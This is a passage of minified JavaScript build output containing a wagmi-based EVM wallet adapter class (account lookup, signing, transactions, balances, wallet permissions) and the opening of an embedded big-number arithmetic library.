VG={enable:!1,pollingInterval:3e4};class KG extends j2{constructor(e){const r=ki.extendCaipNetworks(e.networks,{projectId:e.projectId,customNetworkImageUrls:{},customRpcUrls:e.customRpcUrls});super({projectId:e.projectId,adapterType:Z.ADAPTER_TYPES.WAGMI,namespace:Z.CHAIN.EVM}),this.balancePromises={},this.pendingTransactionsFilter={...VG,...e.pendingTransactionsFilter??{}},this.createConfig({...e,networks:r}),this.setupWatchers()}async getAccounts(e){var s;const r=this.getWagmiConnector(e.id);if(!r)return{accounts:[]};if(r.id===Z.CONNECTOR_ID.AUTH){const o=r.provider;if(!o.user)return{accounts:[]};const{address:a,accounts:c}=o.user;return Promise.resolve({accounts:(c||[{address:a,type:"eoa"}]).map(u=>Ie.createAccount("eip155",u.address,u.type))})}const{addresses:n,address:i}=rf(this.wagmiConfig);return Promise.resolve({accounts:(s=n||[i])==null?void 0:s.map(o=>Ie.createAccount("eip155",o||"","eoa"))})}getWagmiConnector(e){return this.wagmiConfig.connectors.find(r=>r.id===e)}createConfig(e){this.wagmiChains=e.networks.filter(i=>i.chainNamespace===Z.CHAIN.EVM);const r={},n=[...e.connectors??[]];this.wagmiChains.forEach(i=>{var a,c;const s=(a=e.transports)==null?void 0:a[i.id],o=ki.getCaipNetworkId(i);s?r[i.id]=ki.extendWagmiTransports(i,e.projectId,s):r[i.id]=ki.getViemTransport(i,e.projectId,(c=e.customRpcUrls)==null?void 0:c[o])}),this.wagmiConfig=oG({...e,chains:this.wagmiChains,connectors:n,transports:r})}setupWatchPendingTransactions(){if(!this.pendingTransactionsFilter.enable||this.unwatchPendingTransactions)return;this.unwatchPendingTransactions=$W(this.wagmiConfig,{pollingInterval:this.pendingTransactionsFilter.pollingInterval,onError:()=>{},onTransactions:()=>{this.emit("pendingTransactions"),mA.increase("pendingTransactions")}});const e=mA.subscribeKey("pendingTransactions",r=>{var n;r>=Z.LIMITS.PENDING_TRANSACTIONS&&((n=this.unwatchPendingTransactions)==null||n.call(this),e())})}setupWatchers(){BW(this.wagmiConfig,{onChange:(e,r)=>{e.status==="disconnected"&&r.address&&this.emit("disconnect"),e.status==="connected"&&((e.address!==(r==null?void 0:r.address)||r.status!=="connected")&&(this.setupWatchPendingTransactions(),this.emit("accountChanged",{address:e.address,chainId:e.chainId})),e.chainId!==(r==null?void 0:r.chainId)&&this.emit("switchNetwork",{address:e.address,chainId:e.chainId}))}})}async addThirdPartyConnectors(e){var n,i;const r=[];if(e.enableCoinbase!==!1)try{const{coinbaseWallet:s}=await ln(async()=>{const{coinbaseWallet:o}=await import("./index-C21SFCy6.js");return{coinbaseWallet:o}},[]);s&&r.push(s({version:"4",appName:((n=e.metadata)==null?void 0:n.name)??"Unknown",appLogoUrl:((i=e.metadata)==null?void 0:i.icons[0])??"Unknown",preference:e.coinbasePreference??"all"}))}catch(s){console.error("Failed to import Coinbase Wallet SDK:",s)}r.forEach(s=>{const o=this.wagmiConfig._internal.connectors.setup(s);this.wagmiConfig._internal.connectors.setState(a=>[...a,o])})}addWagmiConnectors(e,r){var o,a,c,u,l;const n=[];e.enableWalletConnect!==!1&&n.push(Wy(e,r)),e.enableInjected!==!1&&n.push(Zf({shimDisconnect:!0}));const i=((o=e.features)==null?void 0:o.email)===void 0?Ar.DEFAULT_FEATURES.email:(a=e.features)==null?void 0:a.email,s=(c=e.features)!=null&&c.socials?((l=(u=e.features)==null?void 0:u.socials)==null?void 0:l.length)>0:Ar.DEFAULT_FEATURES.socials;(i||s)&&n.push(WG({chains:this.wagmiChains,options:{projectId:e.projectId,enableAuthLogger:e.enableAuthLogger}})),n.forEach(h=>{const d=this.wagmiConfig._internal.connectors.setup(h);this.wagmiConfig._internal.connectors.setState(g=>[...g,d])})}async signMessage(e){try{return{signature:await DW(this.wagmiConfig,{message:e.message,account:e.address})}}catch{throw new Error("WagmiAdapter:signMessage - Sign message failed")}}async sendTransaction(e){const{chainId:r}=rf(this.wagmiConfig),n={account:e.address,to:e.to,value:e.value,gas:e.gas,gasPrice:e.gasPrice,data:e.data,chainId:r,type:"legacy",parameters:["nonce"]};await RW(this.wagmiConfig,n);const i=await kW(this.wagmiConfig,n);return await LW(this.wagmiConfig,{hash:i,timeout:25e3}),{hash:i}}async writeContract(e){var o;const{caipNetwork:r,...n}=e,i=Number(qu.caipNetworkIdToNumber(r.caipNetworkId));return{hash:await FW(this.wagmiConfig,{chain:(o=this.wagmiChains)==null?void 0:o[i],chainId:i,address:n.tokenAddress,account:n.fromAddress,abi:n.abi,functionName:n.method,args:n.args,__mode:"prepared"})}}async getEnsAddress(e){const{name:r,caipNetwork:n}=e;try{if(!this.wagmiConfig)throw new Error("networkControllerClient:getApprovedCaipNetworksData - wagmiConfig is undefined");let i=!1,s=!1;return NS(r)&&(s=await Yf.resolveReownName(r)||!1),n.id===1&&(i=await NW(this.wagmiConfig,{name:HG(r),chainId:n.id})),{address:i||s||!1}}catch{return{address:!1}}}async estimateGas(e){try{return{gas:await _W(this.wagmiConfig,{account:e.address,to:e.to,data:e.data,type:"legacy"})}}catch{throw new Error("WagmiAdapter:estimateGas - error estimating gas")}}parseUnits(e){return lq(e.value,e.decimals)}formatUnits(e){return Wc(e.value,e.decimals)}async addWagmiConnector(e,r){var i;if(e.id===Z.CONNECTOR_ID.AUTH||e.id===Z.CONNECTOR_ID.WALLET_CONNECT)return;const n=await e.getProvider().catch(()=>{});this.addConnector({id:e.id,explorerId:Qs.ConnectorExplorerIds[e.id],imageUrl:((i=r==null?void 0:r.connectorImages)==null?void 0:i[e.id])??e.icon,name:Qs.ConnectorNamesMap[e.id]??e.name,imageId:Qs.ConnectorImageIds[e.id],type:Qs.ConnectorTypesMap[e.type]??"EXTERNAL",info:e.id===Z.CONNECTOR_ID.INJECTED?void 0:{rdns:e.id},provider:n,chain:this.namespace,chains:[]})}async syncConnectors(e,r){UW(this.wagmiConfig,{onChange:n=>n.forEach(i=>this.addWagmiConnector(i,e))}),await Promise.all(this.wagmiConfig.connectors.map(n=>this.addWagmiConnector(n,e))),this.addWagmiConnectors(e,r),await this.addThirdPartyConnectors(e)}async syncConnection(e){const{id:r}=e,i=Wa(this.wagmiConfig).find(a=>a.connector.id===r),s=this.getWagmiConnector(r),o=await(s==null?void 0:s.getProvider());return{chainId:Number(i==null?void 0:i.chainId),address:i==null?void 0:i.accounts[0],provider:o,type:i==null?void 0:i.connector.type,id:i==null?void 0:i.connector.id}}async connectWalletConnect(e){const r=this.getWalletConnectConnector();await r.authenticate();const n=this.getWagmiConnector("walletConnect");if(!n)throw new Error("UniversalAdapter:connectWalletConnect - connector not found");const i=await iA(this.wagmiConfig,{connector:n,chainId:e?Number(e):void 0});return i.chainId!==Number(e)&&await oA(this.wagmiConfig,{chainId:i.chainId}),{clientId:await r.provider.client.core.crypto.getClientId()}}async connect(e){var u,l,h,d,g;const{id:r,provider:n,type:i,info:s,chainId:o}=e,a=this.getWagmiConnector(r);if(!a)throw new Error("connectionControllerClient:connectExternal - connector is undefined");if(n&&s&&a.id===Z.CONNECTOR_ID.EIP6963&&((u=a.setEip6963Wallet)==null||u.call(a,{provider:n,info:s})),a.uid===((h=(l=this.wagmiConfig)==null?void 0:l.state)==null?void 0:h.current)){const y=(g=(d=this.wagmiConfig.state)==null?void 0:d.connections)==null?void 0:g.get(a.uid);if(y)return{address:y==null?void 0:y.accounts[0],chainId:y==null?void 0:y.chainId,provider:n,type:i,id:r}}const c=await iA(this.wagmiConfig,{connector:a,chainId:o?Number(o):void 0});return{address:c.accounts[0],chainId:c.chainId,provider:n,type:i,id:r}}async reconnect(e){const{id:r}=e,n=this.getWagmiConnector(r);if(!n)throw new Error("connectionControllerClient:connectExternal - connector is undefined");await OW(this.wagmiConfig,{connectors:[n]})}async getBalance(e){const r=e.address,n=this.getCaipNetworks().find(i=>i.id===e.chainId);if(!r)return Promise.resolve({balance:"0.00",symbol:"ETH"});if(n&&this.wagmiConfig){const i=`${n.caipNetworkId}:${e.address}`,s=this.balancePromises[i];if(s)return s;const o=le.getNativeBalanceCacheForCaipAddress(i);return o?{balance:o.balance,symbol:o.symbol}:(this.balancePromises[i]=new Promise(async a=>{var c,u;try{const l=Number(e.chainId),h=await SW(this.wagmiConfig,{address:e.address,chainId:l,token:(u=(c=e.tokens)==null?void 0:c[n.caipNetworkId])==null?void 0:u.address});le.updateNativeBalanceCache({caipAddress:i,balance:h.formatted,symbol:h.symbol,timestamp:Date.now()}),a({balance:h.formatted,symbol:h.symbol})}catch(l){console.warn("Appkit:WagmiAdapter:getBalance - Error getting balance",l),a({balance:"0.00",symbol:"ETH"})}}).finally(()=>{delete this.balancePromises[i]}),this.balancePromises[i]||{balance:"0.00",symbol:"ETH"})}return{balance:"",symbol:""}}async getProfile(e){const r=e.chainId,n=await PW(this.wagmiConfig,{address:e.address,chainId:r});if(n){const i=await TW(this.wagmiConfig,{name:n,chainId:r});return{profileName:n,profileImage:i??void 0}}return{profileName:void 0,profileImage:void 0}}getWalletConnectProvider(){var e;return(e=this.getWagmiConnector("walletConnect"))==null?void 0:e.provider}async disconnect(){const e=Wa(this.wagmiConfig);await Promise.all(e.map(async r=>{const n=this.getWagmiConnector(r.connector.id);n&&await AW(this.wagmiConfig,{connector:n})}))}async switchNetwork(e){await oA(this.wagmiConfig,{chainId:e.caipNetwork.id}),await super.switchNetwork(e)}async getCapabilities(e){var a,c;if(!this.wagmiConfig)throw new Error("connectionControllerClient:getCapabilities - wagmiConfig is undefined");const n=Wa(this.wagmiConfig)[0],i=n?this.getWagmiConnector(n.connector.id):null;if(!i)throw new Error("connectionControllerClient:getCapabilities - connector is undefined");const s=await i.getProvider();if(!s)throw new Error("connectionControllerClient:getCapabilities - provider is undefined");const o=(c=(a=s.session)==null?void 0:a.sessionProperties)==null?void 0:c.capabilities;if(o){const l=GG(o)[e];if(l)return l}return await s.request({method:"wallet_getCapabilities",params:[e]})}async grantPermissions(e){if(!this.wagmiConfig)throw new Error("connectionControllerClient:grantPermissions - wagmiConfig is undefined");const n=Wa(this.wagmiConfig)[0],i=n?this.getWagmiConnector(n.connector.id):null;if(!i)throw new Error("connectionControllerClient:grantPermissions - connector is undefined");const s=await i.getProvider();if(!s)throw new Error("connectionControllerClient:grantPermissions - provider is undefined");return s.request({method:"wallet_grantPermissions",params:e})}async revokePermissions(e){if(!this.wagmiConfig)throw new Error("connectionControllerClient:revokePermissions - wagmiConfig is undefined");const n=Wa(this.wagmiConfig)[0],i=n?this.getWagmiConnector(n.connector.id):null;if(!i)throw new Error("connectionControllerClient:revokePermissions - connector is undefined");const s=await i.getProvider();if(!s)throw new Error("connectionControllerClient:revokePermissions - provider is undefined");return s.request({method:"wallet_revokePermissions",params:e})}async walletGetAssets(e){if(!this.wagmiConfig)throw new Error("connectionControllerClient:walletGetAssets - wagmiConfig is undefined");const n=Wa(this.wagmiConfig)[0],i=n?this.getWagmiConnector(n.connector.id):null;if(!i)throw new Error("connectionControllerClient:walletGetAssets - connector is undefined");const s=await i.getProvider();if(!s)throw new Error("connectionControllerClient:walletGetAssets - provider is undefined");return s.request({method:"wallet_getAssets",params:[e]})}setUniversalProvider(e){this.addConnector(new jy({provider:e,caipNetworks:this.getCaipNetworks(),namespace:"eip155"}))}}var wd={exports:{}};const QG={},YG=Object.freeze(Object.defineProperty({__proto__:null,default:QG},Symbol.toStringTag,{value:"Module"})),JG=z0(YG);var ZG=wd.exports,yA;function XG(){return yA||(yA=1,function(t){(function(e,r){function n(N,f){if(!N)throw new Error(f||"Assertion failed")}function i(N,f){N.super_=f;var p=function(){};p.prototype=f.prototype,N.prototype=new p,N.prototype.constructor=N}function s(N,f,p){if(s.isBN(N))return N;this.negative=0,this.words=null,this.length=0,this.red=null,N!==null&&((f==="le"||f==="be")&&(p=f,f=10),this._init(N||0,f||10,p||"be"))}typeof e=="object"?e.exports=s:r.BN=s,s.BN=s,s.wordSize=26;var o;try{typeof window<"u"&&typeof window.Buffer<"u"?o=window.Buffer:o=JG.Buffer}catch{}s.isBN=function(f){return f instanceof s?!0:f!==null&&typeof f=="object"&&f.constructor.wordSize===s.wordSize&&Array.isArray(f.words)},s.max=function(f,p){return f.cmp(p)>0?f:p},s.min=function(f,p){return f.cmp(p)<0?f:p},s.prototype._init=function(f,p,w){if(typeof f=="number")return this._initNumber(f,p,w);if(typeof f=="object")return this._initArray(f,p,w);p==="hex"&&(p=16),n(p===(p|0)&&p>=2&&p<=36),f=f.toString().replace(/\s+/g,"");var E=0;f[0]==="-"&&(E++,this.negative=1),E<f.length&&(p===16?this._parseHex(f,E,w):(this._parseBase(f,p,E),w==="le"&&this._initArray(this.toArray(),p,w)))},s.prototype._initNumber=function(f,p,w){f<0&&(this.negative=1,f=-f),f<67108864?(this.words=[f&67108863],this.length=1):f<4503599627370496?(this.words=[f&67108863,f/67108864&67108863],this.length=2):(n(f<9007199254740992),this.words=[f&67108863,f/67108864&67108863,1],this.length=3),w==="le"&&this._initArray(this.toArray(),p,w)},s.prototype._initArray=function(f,p,w){if(n(typeof f.length=="number"),f.length<=0)return this.words=[0],this.length=1,this;this.length=Math.ceil(f.length/3),this.words=new Array(this.length);for(var E=0;E<this.length;E++)this.words[E]=0;var x,R,B=0;if(w==="be")for(E=f.length-1,x=0;E>=0;E-=3)R=f[E]|f[E-1]<<8|f[E-2]<<16,this.words[x]|=R<<B&67108863,this.words[x+1]=R>>>26-B&67108863,B+=24,B>=26&&(B-=26,x++);else if(w==="le")for(E=0,x=0;E<f.length;E+=3)R=f[E]|f[E+1]<<8|f[E+2]<<16,this.words[x]|=R<<B&67108863,this.words[x+1]=R>>>26-B&67108863,B+=24,B>=26&&(B-=26,x++);return this._strip()};function a(N,f){var p=N.charCodeAt(f);if(p>=48&&p<=57)return p-48;if(p>=65&&p<=70)return p-55;if(p>=97&&p<=102)return p-87;n(!1,"Invalid character in "+N)}function c(N,f,p){var w=a(N,p);return p-1>=f&&(w|=a(N,p-1)<<4),w}s.prototype._parseHex=function(f,p,w){this.length=Math.ceil((f.length-p)/6),this.words=new Array(this.length);for(var E=0;E<this.length;E++)this.words[E]=0;var x=0,R=0,B;if(w==="be")for(E=f.length-1;E>=p;E-=2)B=c(f,p,E)<<x,this.words[R]|=B&67108863,x>=18?(x-=18,R+=1,this.words[R]|=B>>>26):x+=8;else{var k=f.length-p;for(E=k%2===0?p+1:p;E<f.length;E+=2)B=c(f,p,E)<<x,this.words[R]|=B&67108863,x>=18?(x-=18,R+=1,this.words[R]|=B>>>26):x+=8}this._strip()};function u(N,f,p,w){for(var E=0,x=0,R=Math.min(N.length,p),B=f;B<R;B++){var k=N.charCodeAt(B)-48;E*=w,k>=49?x=k-49+10:k>=17?x=k-17+10:x=k,n(k>=0&&x<w,"Invalid character"),E+=x}return E}s.prototype._parseBase=function(f,p,w){this.words=[0],this.length=1;for(var E=0,x=1;x<=67108863;x*=p)E++;E--,x=x/p|0;for(var R=f.length-w,B=R%E,k=Math.min(R,R-B)+w,v=0,M=w;M<k;M+=E)v=u(f,M,M+E,p),this.imuln(x),this.words[0]+v<67108864?this.words[0]+=v:this._iaddn(v);if(B!==0){var V=1;for(v=u(f,M,f.length,p),M=0;M<B;M++)V*=p;this.imuln(V),this.words[0]+v<67108864?this.words[0]+=v:this._iaddn(v)}this._strip()},s.prototype.copy=function(f){f.words=new Array(this.length);for(var p=0;p<this.length;p++)f.words[p]=this.words[p];f.length=this.length,f.negative=this.negative,f.red=this.red};function l(N,f){N.words=f.words,N.length=f.length,N.negative=f.negative,N.red=f.red}if(s.prototype._move=function(f){l(f,this)},s.prototype.clone=function(){var f=new s(null);return this.copy(f),f},s.prototype._expand=function(f){for(;this.length<f;)this.words[this.length++]=0;return this},s.prototype._strip=function(){for(;this.length>1&&this.words[this.length-1]===0;)this.length--;return this._normSign()},s.prototype._normSign=function(){return this.length===1&&this.words[0]===0&&(this.negative=0),this},typeof Symbol<"u"&&typeof Symbol.for=="function")try{s.prototype[Symbol.for("nodejs.util.inspect.custom")]=h}catch{s.prototype.inspect=h}else s.prototype.inspect=h;function h(){return(this.red?"<BN-R: ":"<BN: ")+this.toString(16)+">"}var d=["","0","00","000","0000","00000","000000","0000000","00000000","000000000","0000000000","00000000000","000000000000","0000000000000","00000000000000","000000000000000","0000000000000000","00000000000000000","000000000000000000","0000000000000000000","00000000000000000000","000000000000000000000","0000000000000000000000","00000000000000000000000","000000000000000000000000","0000000000000000000000000"],g=[0,0,25,16,12,11,10,9,8,8,7,7,7,7,6,6,6,6,6,6,6,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5],y=[0,0,33554432,43046721,16777216,48828125,60466176,40353607,16777216,43046721,1e7,19487171,35831808,62748517,7529536,11390625,16777216,24137569,34012224,47045881,64e6,4084101,5153632,6436343,7962624,9765625,11881376,14348907,17210368,20511149,243e5,28629151,33554432,39135393,45435424,52521875,60466176];s.prototype.toString=function(f,p){f=f||10,p=p|0||1;var w;if(f===16||f==="hex"){w="";for(var E=0,x=0,R=0;R<this.length;R++){var B=this.words[R],k=((B<<E|x)&16777215).toString(16);x=B>>>24-E&16777215,E+=2,E>=26&&(E-=26,R--),x!==0||R!==this.length-1?w=d[6-k.length]+k+w:w=k+w}for(x!==0&&(w=x.toString(16)+w);w.length%p!==0;)w="0"+w;return this.negative!==0&&(w="-"+w),w}if(f===(f|0)&&f>=2&&f<=36){var v=g[f],M=y[f];w="";var V=this.clone();for(V.negative=0;!V.isZero();){var I=V.modrn(M).toString(f);V=V.idivn(M),V.isZero()?w=I+w:w=d[v-I.length]+I+w}for(this.isZero()&&(w="0"+w);w.length%p!==0;)w="0"+w;return this.negative!==0&&(w="-"+w),w}n(!1,"Base should be between 2 and 36")},s.prototype.toNumber=function(){var f=this.words[0];return this.length===2?f+=this.words[1]*67108864:this.length===3&&this.words[2]===1?f+=4503599627370496+this.words[1]*67108864:this.length>2&&n(!1,"Number can only safely store up to 53 bits"),this.negative!==0?-f:f},s.prototype.toJSON=function(){return this.toString(16,2)},o&&(s.prototype.toBuffer=function(f,p){return this.toArrayLike(o,f,p)}),s.prototype.toArray=function(f,p){return this.toArrayLike(Array,f,p)};var m=function(f,p){return f.allocUnsafe?f.allocUnsafe(p):new f(p)};s.prototype.toArrayLike=function(f,p,w){this._strip();var E=this.byteLength(),x=w||Math.max(1,E);n(E<=x,"byte array longer than desired length"),n(x>0,"Requested array length <= 0");var R=m(f,x),B=p==="le"?"LE":"BE";return this["_toArrayLike"+B](R,E),R},s.prototype._toArrayLikeLE=function(f,p){for(var w=0,E=0,x=0,R=0;x<this.length;x++){var B=this.words[x]<<R|E;f[w++]=B&255,w<f.length&&(f[w++]=B>>8&255),w<f.length&&(f[w++]=B>>16&255),R===6?(w<f.length&&(f[w++]=B>>24&255),E=0,R=0):(E=B>>>24,R+=2)}if(w<f.length)for(f[w++]=E;w<f.length;)f[w++]=0},s.prototype._toArrayLikeBE=function(f,p){for(var w=f.length-1,E=0,x=0,R=0;x<this.length;x++){var B=this.words[x]<<R|E;f[w--]=B&255,w>=0&&(f[w--]=B>>8&255),w>=0&&(f[w--]=B>>16&255),R===6?(w>=0&&(f[w--]=B>>24&255),E=0,R=0):(E=B>>>24,R+=2)}if(w>=0)for(f[w--]=E;w>=0;)f[w--]=0},Math.clz32?s.prototype._countBits=function(f){return 32-Math.clz32(f)}:s.prototype._countBits=function(f){var p=f,w=0;return p>=4096&&(w+=13,p>>>=13),p>=64&&(w+=7,p>>>=7),p>=8&&(w+=4,p>>>=4),p>=2&&(w+=2,p>>>=2),w+p},s.prototype._zeroBits=function(f){if(f===0)return 26;var p=f,w=0;return(p&8191)===0&&(w+=13,p>>>=13),(p&127)===0&&(w+=7,p>>>=7),(p&15)===0&&(w+=4,p>>>=4),(p&3)===0&&(w+=2,p>>>=2),(p&1)===0&&w++,w},s.prototype.bitLength=function(){var f=this.words[this.length-1],p=this._countBits(f);return(this.length-1)*26+p};function b(N){for(var f=new Array(N.bitLength()),p=0;p<f.length;p++){var w=p/26|0,E=p%26;f[p]=N.words[w]>>>E&1}return f}s.prototype.zeroBits=function(){if(this.isZero())return 0;for(var f=0,p=0;p<this.length;p++){var w=this._zeroBits(this.words[p]);if(f+=w,w!==26)break}return f},s.prototype.byteLength=function(){return Math.ceil(this.bitLength()/8)},s.prototype.toTwos=function(f){return this.negative!==0?this.abs().inotn(f).iaddn(1):this.clone()},s.prototype.fromTwos=function(f){return this.testn(f-1)?this.notn(f).iaddn(1).ineg():this.clone()},s.prototype.isNeg=function(){return this.negative!==0},s.prototype.neg=function(){return this.clone().ineg()},s.prototype.ineg=function(){return this.isZero()||(this.negative^=1),this},s.prototype.iuor=function(f){for(;this.length<f.length;)this.words[this.length++]=0;for(var p=0;p<f.length;p++)this.words[p]=this.words[p]|f.words[p];return this._strip()},s.prototype.ior=function(f){return n((this.negative|f.negative)===0),this.iuor(f)},s.prototype.or=function(f){return this.length>f.length?this.clone().ior(f):f.clone().ior(this)},s.prototype.uor=function(f){return this.length>f.length?this.clone().iuor(f):f.clone().iuor(this)},s.prototype.iuand=function(f){var p;this.length>f.length?p=f:p=this;for(var w=0;w<p.length;w++)this.words[w]=this.words[w]&f.words[w];return this.length=p.length,this._strip()},s.prototype.iand=function(f){return n((this.negative|f.negative)===0),this.iuand(f)},s.prototype.and=function(f){return this.length>f.length?this.clone().iand(f):f.clone().iand(this)},s.prototype.uand=function(f){return this.length>f.length?this.clone().iuand(f):f.clone().iuand(this)},s.prototype.iuxor=function(f){var p,w;this.length>f.length?(p=this,w=f):(p=f,w=this);for(var E=0;E<w.length;E++)this.words[E]=p.words[E]^w.words[E];if(this!==p)for(;E<p.length;E++)this.words[E]=p.words[E];return this.length=p.length,this._strip()},s.prototype.ixor=function(f){return n((this.negative|f.negative)===0),this.iuxor(f)},s.prototype.xor=function(f){return this.length>f.length?this.clone().ixor(f):f.clone().ixor(this)},s.prototype.uxor=function(f){return this.length>f.length?this.clone().iuxor(f):f.clone().iuxor(this)},s.prototype.inotn=function(f){n(typeof f=="number"&&f>=0);var p=Math.ceil(f/26)|0,w=f%26;this._expand(p),w>0&&p--;for(var E=0;E<p;E++)this.words[E]=~this.words[E]&67108863;return w>0&&(this.words[E]=~this.words[E]&67108863>>26-w),this._strip()},s.prototype.notn=function(f){return this.clone().inotn(f)},s.prototype.setn=function(f,p){n(typeof f=="number"&&f>=0);var w=f/26|0,E=f%26;return this._expand(w+1),p?this.words[w]=this.words[w]|1<<E:this.words[w]=this.words[w]&~(1<<E),this._strip()},s.prototype.iadd=function(f){var p;if(this.negative!==0&&f.negative===0)return this.negative=0,p=this.isub(f),this.negative^=1,this._normSign();if(this.negative===0&&f.negative!==0)return f.negative=0,p=this.isub(f),f.negative=1,p._normSign();var w,E;this.length>f.length?(w=this,E=f):(w=f,E=this);for(var x=0,R=0;R<E.length;R++)p=(w.words[R]|0)+(E.words[R]|0)+x,this.words[R]=p&67108863,x=p>>>26;for(;x!==0&&R<w.length;R++)p=(w.words[R]|0)+x,this.words[R]=p&67108863,x=p>>>26;if(this.length=w.length,x!==0)this.words[this.length]=x,this.length++;else if(w!==this)for(;R<w.length;R++)this.words[R]=w.words[R];return this},s.prototype.add=function(f){var p;return f.negative!==0&&this.negative===0?(f.negative=0,p=this.sub(f),f.negative^=1,p):f.negative===0&&this.negative!==0?(this.negative=0,p=f.sub(this),this.negative=1,p):this.length>f.length?this.clone().iadd(f):f.clone().iadd(this)},s.prototype.isub=function(f){if(f.negative!==0){f.negative=0;var p=this.iadd(f);return f.negative=1,p._normSign()}else if(this.negative!==0)return this.negative=0,this.iadd(f),this.negative=1,this._normSign();var w=this.cmp(f);if(w===0)return this.negative=0,this.length=1,this.words[0]=0,this;var E,x;w>0?(E=this,x=f):(E=f,x=this);for(var R=0,B=0;B<x.length;B++)p=(E.words[B]|0)-(x.words[B]|0)+R,R=p>>26,this.words[B]=p&67108863;for(;R!==0&&B<E.length;B++)p=(E.words[B]|0)+R,R=p>>26,this.words[B]=p&67108863;if(R===0&&B<E.length&&E!==this)for(;B<E.length;B++)this.words[B]=E.words[B];return this.length=Math.max(this.length,B),E!==this&&(this.negative=1),this._strip()},s.prototype.sub=function(f){return this.clone().isub(f)};function A(N,f,p){p.negative=f.negative^N.negative;var w=N.length+f.length|0;p.length=w,w=w-1|0;var E=N.words[0]|0,x=f.words[0]|0,R=E*x,B=R&67108863,k=R/67108864|0;p.words[0]=B;for(var v=1;v<w;v++){for(var M=k>>>26,V=k&67108863,I=Math.min(v,f.length-1),z=Math.max(0,v-N.length+1);z<=I;z++){var G=v-z|0;E=N.words[G]|0,x=f.words[z]|0,R=E*x+V,M+=R/67108864|0,V=R&67108863}p.words[v]=V|0,k=M|0}return k!==0?p.words[v]=k|0:p.length--,p._strip()}var _=function(f,p,w){var E=f.words,x=p.words,R=w.words,B=0,k,v,M,V=E[0]|0,I=V&8191,z=V>>>13,G=E[1]|0,W=G&8191,K=G>>>13,ae=E[2]|0,ee=ae&8191,J=ae>>>13,Te=E[3]|0,ie=Te&8191,ye=Te>>>13,Vr=E[4]|0,ze=Vr&8191,tt=Vr>>>13,yn=E[5]|0,Ze=yn&8191,We=yn>>>13,wn=E[6]|0,Xe=wn&8191,He=wn>>>13,Kr=E[7]|0,et=Kr&8191,rt=Kr>>>13,Qi=E[8]|0,ft=Qi&8191,pt=Qi>>>13,ho=E[9]|0,_t=ho&8191,Ct=ho>>>13,fo=x[0]|0,It=fo&8191,xt=fo>>>13,po=x[1]|0,St=po&8191,Nt=po>>>13,go=x[2]|0,Tt=go&8191,Pt=go>>>13,mo=x[3]|0,Rt=mo&8191,Ot=mo>>>13,yo=x[4]|0,kt=yo&8191,Dt=yo>>>13,wo=x[5]|0,Mt=wo&8191,Bt=wo>>>13,bo=x[6]|0,Ut=bo&8191,$t=bo>>>13,vo=x[7]|0,Lt=vo&8191,Ft=vo>>>13,Eo=x[8]|0,jt=Eo&8191,qt=Eo>>>13,Ao=x[9]|0,zt=Ao&8191,Ht=Ao>>>13;w.negative=f.negative^p.negative,w.length=19,k=Math.imul(I,It),v=Math.imul(I,xt),v=v+Math.imul(z,It)|0,M=Math.imul(z,xt);var Is=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(Is>>>26)|0,Is&=67108863,k=Math.imul(W,It),v=Math.imul(W,xt),v=v+Math.imul(K,It)|0,M=Math.imul(K,xt),k=k+Math.imul(I,St)|0,v=v+Math.imul(I,Nt)|0,v=v+Math.imul(z,St)|0,M=M+Math.imul(z,Nt)|0;var xs=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(xs>>>26)|0,xs&=67108863,k=Math.imul(ee,It),v=Math.imul(ee,xt),v=v+Math.imul(J,It)|0,M=Math.imul(J,xt),k=k+Math.imul(W,St)|0,v=v+Math.imul(W,Nt)|0,v=v+Math.imul(K,St)|0,M=M+Math.imul(K,Nt)|0,k=k+Math.imul(I,Tt)|0,v=v+Math.imul(I,Pt)|0,v=v+Math.imul(z,Tt)|0,M=M+Math.imul(z,Pt)|0;var Ss=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(Ss>>>26)|0,Ss&=67108863,k=Math.imul(ie,It),v=Math.imul(ie,xt),v=v+Math.imul(ye,It)|0,M=Math.imul(ye,xt),k=k+Math.imul(ee,St)|0,v=v+Math.imul(ee,Nt)|0,v=v+Math.imul(J,St)|0,M=M+Math.imul(J,Nt)|0,k=k+Math.imul(W,Tt)|0,v=v+Math.imul(W,Pt)|0,v=v+Math.imul(K,Tt)|0,M=M+Math.imul(K,Pt)|0,k=k+Math.imul(I,Rt)|0,v=v+Math.imul(I,Ot)|0,v=v+Math.imul(z,Rt)|0,M=M+Math.imul(z,Ot)|0;var Ns=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(Ns>>>26)|0,Ns&=67108863,k=Math.imul(ze,It),v=Math.imul(ze,xt),v=v+Math.imul(tt,It)|0,M=Math.imul(tt,xt),k=k+Math.imul(ie,St)|0,v=v+Math.imul(ie,Nt)|0,v=v+Math.imul(ye,St)|0,M=M+Math.imul(ye,Nt)|0,k=k+Math.imul(ee,Tt)|0,v=v+Math.imul(ee,Pt)|0,v=v+Math.imul(J,Tt)|0,M=M+Math.imul(J,Pt)|0,k=k+Math.imul(W,Rt)|0,v=v+Math.imul(W,Ot)|0,v=v+Math.imul(K,Rt)|0,M=M+Math.imul(K,Ot)|0,k=k+Math.imul(I,kt)|0,v=v+Math.imul(I,Dt)|0,v=v+Math.imul(z,kt)|0,M=M+Math.imul(z,Dt)|0;var Ts=(B+k|0)+((v&8191)<<13)|0;B=(M+(v>>>13)|0)+(Ts>>>26)|0,Ts&=67108863,k=Math.imul(Ze,It),v=Math.imul(Ze,xt),v=v+Math.imul(We,It)|0,M=Math.imul(We,xt),k=k+Math.imul(ze,St)|0,v=v+Math.imul(ze,Nt)|0,v=v+Math.imul(tt,St)|0,M=M+Math.imul(tt,Nt)|0,k=k+Math.imul(ie,Tt)|0,v=v+Math.imul(ie,Pt)|0,v=v+Math.imul(ye,Tt)|0,M=M+Math.imul(ye,Pt)|0,k=k+Math.imul(ee,Rt)|0,v=v+Math.imul(ee,Ot)|0,v=v+Math.imul(J,Rt)|0,M=M+Math.imul(J,Ot)|0,k=k+Math.imul(W,kt)|0,v=v+Math.imul(W,Dt)|0,v=v+Math.imul(K,kt)|0,M=M+Math.imul(K,Dt)|0,k=k+Math.imul(I,Mt)|0,v=v+Math.imul(I,Bt)|0,v=v+Math.imul(z,Mt)|0,M=M+Math.imul(z,Bt)|0;var 